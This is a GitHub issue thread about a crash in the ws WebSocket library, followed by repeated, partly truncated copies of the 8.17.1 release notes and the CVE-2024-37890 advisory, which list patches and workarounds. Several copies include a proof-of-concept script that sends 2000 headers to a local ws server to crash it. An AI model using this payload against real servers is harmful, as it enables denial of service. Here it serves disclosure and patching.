| Is there an existing issue for this?  * I've searched for any related issues and avoided creating a duplicate issue.  Description I use this package for a websocket server. In the process of changing some options to try to make my websocket server slightly more resistant to DoS, I lowered the [maxHeadersCount](https://nodejs.org/docs/latest-v21.x/api/https.html#servermaxheaderscount) field on the HTTP server from its default of 2000 to a lower value. I then tested to see whether the server would reject requests with too many headers. Instead, the server crashed due to a `TypeError` from [websocket-server.js line 246](https://github.com/websockets/ws/blob/6a00029edd924499f892aed8003cef1fa724cfe5/lib/websocket-server.js#L246). This seems like a DoS issue.  I found this similar issue: [#1838](https://github.com/websockets/ws/issues/1838) ws version 8.17.0 Node.js Version v21.5.0 System OS: Debian GNU/Linux 12 (bookworm) CPU: x64 Intel Core i5 CPU Memory: 2.62 GB / 6.58 GB Container: Yes Shell: /bin/bash Expected result I expected the websocket server to refuse the handshake. Maybe respond with a 400 Bad Request. I did not expect my server app to crash from a `TypeError`. Actual result ``` webpack://somewhere/node_modules/ws/lib/websocket-server.js:246     if (req.headers.upgrade.toLowerCase() !== 'websocket') {                             ^   TypeError: Cannot read properties of undefined (reading 'toLowerCase')     at handleUpgrade (webpack://somewhere/node_modules/ws/lib/websocket-server.js:246:29)     at Server.upgrade (webpack://somewhere/node_modules/ws/lib/websocket-server.js:119:16)     at Server.emit (node:events:519:28)     at onParserExecuteCommon (node:_http_server:942:14)     at onParserExecute (node:_http_server:836:3)  Node.js v21.5.0  ``` Attachments *No response* |

| Please create a minimal reproducible test case using only `ws`. As per [#1838 (comment)](https://github.com/websockets/ws/issues/1838#issuecomment-769323770), [#1838 (comment)](https://github.com/websockets/ws/issues/1838#issuecomment-769334901) and [#1838 (comment)](https://github.com/websockets/ws/issues/1838#issuecomment-769346802) it cannot happen unless `ws` is incorrectly used.  If the server `'upgrade'` event is emitted without the `Upgrade` header then the bug is in Node.js core. |

| Here is a test case to reproduce the issue using only Node.js core modules.  ``` const http = require('http');  const server = http.createServer();  server.maxHeadersCount = 1;  server.on('upgrade', function (request) {   console.log(request.headers); });  server.listen(function () {   const { port } = server.address();   const request = http.request({     headers: {       foo: 'foo',       bar: 'bar',       baz: 'baz',       qux: 'qux',       connection: 'Upgrade',       upgrade: 'protocol'     },     host: '127.0.0.1',     port   });    request.end(); }); ```  The `'upgrade'` event is emitted even if `server.maxHeadersCount` is set to `1`. It seems that setting the property does not abort the request. If it is the expected behavior, I wonder what is the purpose of setting that limit. |

<summary>websockets/ws (ws)</summary>

### [`v8.17.1`](https://togithub.com/websockets/ws/releases/tag/8.17.1)

[Compare Source](https://togithub.com/websockets/ws/compare/8.17.0...8.17.1)

### Bug fixes

-   Fixed a DoS vulnerability ([#&#8203;2231](https://togithub.com/websockets/ws/issues/2231)).

A request with a number of headers exceeding the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const server = http.createServer();

const wss = new WebSocket.Server({ server });

server.listen(function () {
  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: server.address().port
  });

  request.end();
});
```

The vulnerability was reported by [Ryan LaPointe](https://togithub.com/rrlapointe) in [https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230).

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1.  Reduce the maximum allowed length of the request headers using the
    [`--max-http-header-size=size`][--max-http-header-size=size] and/or the [`maxHeaderSize`][maxHeaderSize] options so
    that no more headers than the `server.maxHeadersCount` limit can be sent.
2.  Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Features

-   The `WebSocket` constructor now accepts the `createConnection` option ([#&#8203;2219](https://togithub.com/websockets/ws/issues/2219)).

### Other notable changes

-   The default value of the `allowSynchronousEvents` option has been changed to

This is a breaking change in a patch release. The assumption is that the option

### Release Notes

<details>
<summary>websockets/ws (ws)</summary>

### [`v8.17.1`](<https://togithub.com/websockets/ws/releases/tag/8.17.1>)

[Compare Source](<https://togithub.com/websockets/ws/compare/8.17.0...8.17.1>)

### Bug fixes

-   Fixed a DoS vulnerability ([#&#8203;2231](<https://togithub.com/websockets/ws/issues/2231>)).

A request with a number of headers exceeding the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const server = http.createServer();

const wss = new WebSocket.Server({ server });

server.listen(function () {
  const chars = "!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: server.address().port
  });

  request.end();
});
```

The vulnerability was reported by [Ryan LaPointe](<https://togithub.com/rrlapointe>) in [[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230)](https://github.com/websockets/ws/issues/2230%5D%28https%3A//togithub.com/websockets/ws/issues/2230%29).

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1.  Reduce the maximum allowed length of the request headers using the
    [`--max-http-header-size=size`][--max-http-header-size=size] and/or the [`maxHeaderSize`][maxHeaderSize] options so
    that no more headers than the `server.maxHeadersCount` limit can be sent.
2.  Set `server.maxHeadersCount` to `0` so that no limit is applied.

[`--max-http-header-size=size`]: <https://nodejs.org/api/cli.html#--max-http-header-sizesize>

[`maxHeaderSize`]: <https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener>

[`server.maxHeadersCount`]: <https://nodejs.org/api/http.html#servermaxheaderscount>

### [`v8.17.0`](<https://togithub.com/websockets/ws/releases/tag/8.17.0>)

[Compare Source](<https://togithub.com/websockets/ws/compare/8.16.0...8.17.0>)

### Features

-   The `WebSocket` constructor now accepts the `createConnection` option ([#&#8203;2219](<https://togithub.com/websockets/ws/issues/2219>)).

### Other notable changes

-   The default value of the `allowSynchronousEvents` option has been changed to
    `true` ([#&#8203;2221](<https://togithub.com/websockets/ws/issues/2221>)).

This is a breaking change in a patch release. The assumption is that the option
is not widely used.

[Compare Source](https://togithub.com/websockets/ws/compare/8.17.0...8.17.1)

### Bug fixes

-   Fixed a DoS vulnerability ([#&#8203;2231](https://togithub.com/websockets/ws/issues/2231)).

A request with a number of headers exceeding the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const server = http.createServer();

const wss = new WebSocket.Server({ server });

server.listen(function () {
  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: server.address().port
  });

  request.end();
});
```

The vulnerability was reported by [Ryan LaPointe](https://togithub.com/rrlapointe) in [https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230).

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1.  Reduce the maximum allowed length of the request headers using the
    [`--max-http-header-size=size`][--max-http-header-size=size] and/or the [`maxHeaderSize`][maxHeaderSize] options so
    that no more headers than the `server.maxHeadersCount` limit can be sent.
2.  Set `server.maxHeadersCount` to `0` so that no limit is applied.

[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize

[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener

[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount

[Compare Source](https://togithub.com/websockets/ws/compare/8.17.0...8.17.1)

### Bug fixes

-   Fixed a DoS vulnerability ([#&#8203;2231](https://togithub.com/websockets/ws/issues/2231)).

A request with a number of headers exceeding the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const server = http.createServer();

const wss = new WebSocket.Server({ server });

server.listen(function () {
  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: server.address().port
  });

  request.end();
});
```

The vulnerability was reported by [Ryan LaPointe](https://togithub.com/rrlapointe) in [https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230).

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1.  Reduce the maximum allowed length of the request headers using the
    [`--max-http-header-size=size`][--max-http-header-size=size] and/or the [`maxHeaderSize`][maxHeaderSize] options so
    that no more headers than the `server.maxHeadersCount` limit can be sent.
2.  Set `server.maxHeadersCount` to `0` so that no limit is applied.

[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize

[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener

[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount

[Compare Source](<https://togithub.com/websockets/ws/compare/8.17.0...8.17.1>)

### Bug fixes

-   Fixed a DoS vulnerability ([#&#8203;2231](<https://togithub.com/websockets/ws/issues/2231>)).

A request with a number of headers exceeding the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const server = http.createServer();

const wss = new WebSocket.Server({ server });

server.listen(function () {
  const chars = "!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: server.address().port
  });

  request.end();
});
```

The vulnerability was reported by [Ryan LaPointe](<https://togithub.com/rrlapointe>) in [[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230)](https://github.com/websockets/ws/issues/2230%5D%28https%3A//togithub.com/websockets/ws/issues/2230%29).

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1.  Reduce the maximum allowed length of the request headers using the
    [`--max-http-header-size=size`][--max-http-header-size=size] and/or the [`maxHeaderSize`][maxHeaderSize] options so
    that no more headers than the `server.maxHeadersCount` limit can be sent.
2.  Set `server.maxHeadersCount` to `0` so that no limit is applied.

[`--max-http-header-size=size`]: <https://nodejs.org/api/cli.html#--max-http-header-sizesize>

[`maxHeaderSize`]: <https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener>

[`server.maxHeadersCount`]: <https://nodejs.org/api/http.html#servermaxheaderscount>

### GitHub Vulnerability Alerts

####
[CVE-2024-37890](https://togithub.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q)

### Impact

A request with a number of headers exceeding
the[`server.maxHeadersCount`][] threshold could be used to crash a ws
server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

### Patches

The vulnerability was fixed in ws@8.17.1
(https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c)
and backported to ws@7.5.10
(https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f),
ws@6.2.3
(https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63),
and ws@5.2.4
(https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1. Reduce the maximum allowed length of the request headers using the
[`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options
so that no more headers than the `server.maxHeadersCount` limit can be
sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

LaPointe](https://togithub.com/rrlapointe) in

[Compare
Source](<https://togithub.com/websockets/ws/compare/8.17.0...8.17.1>)

### Bug fixes

- Fixed a DoS vulnerability
([#&[#8203](https://github.com/camunda/camunda/pull/8203);2231](<https://togithub.com/websockets/ws/issues/2231>)).

A request with a number of headers exceeding
the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

The vulnerability was reported by [Ryan
LaPointe](<https://togithub.com/rrlapointe>) in
[[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230)](https://github.com/websockets/ws/issues/2230%5D%28https%3A//togithub.com/websockets/ws/issues/2230%29).

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1.  Reduce the maximum allowed length of the request headers using the
[`--max-http-header-size=size`][--max-http-header-size=size] and/or the
[`maxHeaderSize`][maxHeaderSize] options so
that no more headers than the `server.maxHeadersCount` limit can be
sent.
2.  Set `server.maxHeadersCount` to `0` so that no limit is applied.

[`--max-http-header-size=size`]:
<https://nodejs.org/api/cli.html#--max-http-header-sizesize>

[`maxHeaderSize`]:
<https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener>

[`server.maxHeadersCount`]:
